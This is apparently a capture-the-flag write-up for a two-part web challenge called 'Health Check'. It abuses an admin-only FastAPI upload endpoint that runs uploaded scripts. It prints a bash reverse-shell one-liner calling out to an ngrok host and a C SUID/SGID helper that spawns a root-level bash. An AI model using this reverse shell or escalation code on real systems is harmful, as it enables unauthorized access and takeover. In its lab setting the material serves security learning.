# Health Check

## Description

Web | 32 solves

> Want to know whether the challenge is down or it's just your network down? Want to know who to send a message when you want to contact an admin of some challenges? Take a look at our "fastest" Health Check API in the world!
>
> Warning: Do not violate our CTF rules.
>
> Author: chiffoncake

## Solution

### Health Check 1

Visiting the webpage, we could guess through the response headers that the server was using FastAPI. We could download `openapi.json` to see the available endpoints.

````json
 "/new": {
            "post": {
                "summary": "Create Problem",
                "description": "**This endpoint is only for admin. Do NOT share this link with players!**\n\nUpload the health check script to create a new problem. The uploaded file should be a zip file.\nThe zip file should NOT have a top-level folder. In the folder, you must place an executable (or a script) named `run`. You may put other files as you want.\nBelow is an example output of `zipinfo myzip.zip` of a valid `myzip.zip`:\n\n```\nArchive:  myzip.zip\nZip file size: 383 bytes, number of entries: 2\n-rwxrwxr-x  3.0 unx       84 tx defN 22-Aug-20 19:53 run\n-rw-rw-r--  3.0 unx        8 tx stor 22-Aug-20 19:53 my-env\n2 files, 92 bytes uncompressed, 89 bytes compressed:  3.3%\n```\n\nBelow is an example output of an invalid zip (because it has a top-level folder):\n\n```\nArchive:  badzip.zip\nZip file size: 553 bytes, number of entries: 3\ndrwxrwxr-x  3.0 unx        0 bx stor 22-Aug-20 19:55 badzip/\n-rw-rw-r--  3.0 unx        8 tx stor 22-Aug-20 19:55 badzip/myenv\n-rwxrwxr-x  3.0 unx       84 tx defN 22-Aug-20 19:55 badzip/run\n3 files, 92 bytes uncompressed, 89 bytes compressed:  3.3%\n```\n\nEvery 30 seconds, the server will spawn a new process, cd into your folder, and run `./run`. Your `./run` should create `./status.json` to store the health check result, which will be returned when the players request for the status of this problem.\nIf you have any question, please contact @chiffoncake.",
                "operationId": "create_problem_new_post",
                "requestBody": {
                    "content": {
                        "multipart/form-data": {
                            "schema": {
                                "$ref": "#/components/schemas/Body_create_problem_new_post"
                            }
                        }
                    },
                    "required": true
                },
                
                ...
````

We could see the following description for the `/new` endpoint.

> **This endpoint is only for admin. Do NOT share this link with players!**
>
> Upload the health check script to create a new problem. The uploaded file should be a zip file.
>
> The zip file should NOT have a top-level folder. In the folder, you must place an executable (or a script) named `run`. You may put other files as you want.\
> \
> ...

Indeed, we could upload a zip file containing a `run` bash script that gives us a reverse shell.

```bash
#!/bin/sh

bash -c "bash -i >& /dev/tcp/8.tcp.ngrok.io/18920 0>&1"
```

The first flag was readable by the `nobody` user.

### Health Check 2

From our reverse shell, we could see the source code.

```python
import asyncio, os, pathlib, shutil, traceback
from flag1 import flag1

RM_INTERVAL = 20 * 60
HEALTH_CHECK_INTERVAL = 30

data_path = pathlib.Path('data')
backup_path = pathlib.Path.home() / 'backup'


async def background_task1():
    while True:
        await asyncio.sleep(RM_INTERVAL)
        for path_name in data_path.iterdir():
            try:
                shutil.rmtree(path_name)
            except:
                traceback.print_exc()


async def background_task2():
    while True:
        timer = asyncio.create_task(asyncio.sleep(HEALTH_CHECK_INTERVAL))
        processes = {timer}
        for path_name in data_path.iterdir():
            if not path_name.is_dir():
                continue
            async def run(path_name):
                try:
                    if 'docker-entry' in os.listdir(path_name):
                        # experimental
                        await asyncio.create_subprocess_shell(f'sudo chmod -R a+rwx {path_name}; cd {path_name}; chmod a+x ./docker-entry; docker run --rm --cpus=".25" -m="256m" -v=$(realpath .):/data -u=user -w=/data sandbox /data/docker-entry')
                    else:
                        await asyncio.create_subprocess_shell(f'sudo chmod -R a+rwx {path_name}; cd {path_name}; sudo -u nobody ./run')
                except:
                    pass
            processes.add(asyncio.create_task(run(path_name)))

        await asyncio.wait(processes)


if __name__ == '__main__':
    try:
        os.mkdir('data')
    except FileExistsError:
        pass

    async def run():
        os.chmod('flag1.py', 0o440)
        os.chmod('flag2', 0o440)
        os.chmod('data', 0o711)
        asyncio.create_task(background_task1())
        await background_task2()

    asyncio.run(run())
```

We could clearly see that if the zip file name contains `docker-entry`, then instead of running the script as the `nobody` user, we get a shell within a Docker container that has the current directory mounted to `/data`.

```python
if 'docker-entry' in os.listdir(path_name):
    # experimental
    await asyncio.create_subprocess_shell(f'sudo chmod -R a+rwx {path_name}; cd {path_name}; chmod a+x ./docker-entry; docker run --rm --cpus=".25" -m="256m" -v=$(realpath .):/data -u=user -w=/data sandbox /data/docker-entry')
else:
    await asyncio.create_subprocess_shell(f'sudo chmod -R a+rwx {path_name}; cd {path_name}; sudo -u nobody ./run')
```

Let's take a step back - we now have a way of gaining a shell _both inside and outside_ of the Docker container. The shell inside the container has higher privileges than the one outside (the one inside runs as the `uploaded` user, while the one outside runs as the `nobody` user).

I compiled a binary that sets the effective user and group IDs to that of the SUID and SGID permissions, then compiled it and gave it SUID and SGID permissions with `chmod u+s exp` and `chmod g+s exp`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <errno.h>

int main()
{
    int t;
    printf("before, geteuid() returned %d\n", geteuid());
    printf("before, getuid() returned %d\n", getuid());

    t = setuid(geteuid());
    if (t < 0) {
        perror("Error with setuid() - errno " + errno);
        exit(1);
    }

    printf("before, getegid() returned %d\n", getegid());
    printf("before, getgid() returned %d\n", getgid());
    
    t = setgid(getegid());
    if (t < 0) {
        perror("Error with setgid() - errno " + errno);
        exit(1);
    }

    printf("after, geteuid() returned %d\n", geteuid());
    printf("after, getuid() returned %d\n", getuid());

    printf("after, getegid() returned %d\n", getegid());
    printf("after, getgid() returned %d\n", getgid());

    setreuid(geteuid(), geteuid());
    setregid(getegid(), getegid());

    printf("finally, geteuid() returned %d\n", geteuid());
    printf("finally, getuid() returned %d\n", getuid());

    printf("finally, getegid() returned %d\n", getegid());
    printf("finally, getgid() returned %d\n", getgid());

    printf("did work fine, look who I am:\n");
    system("/bin/bash -c whoami");
    system("/bin/bash");
}
```

This gives us the flag!

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-04 at 11.45.12 AM.png" alt=""><figcaption></figcaption></figure>
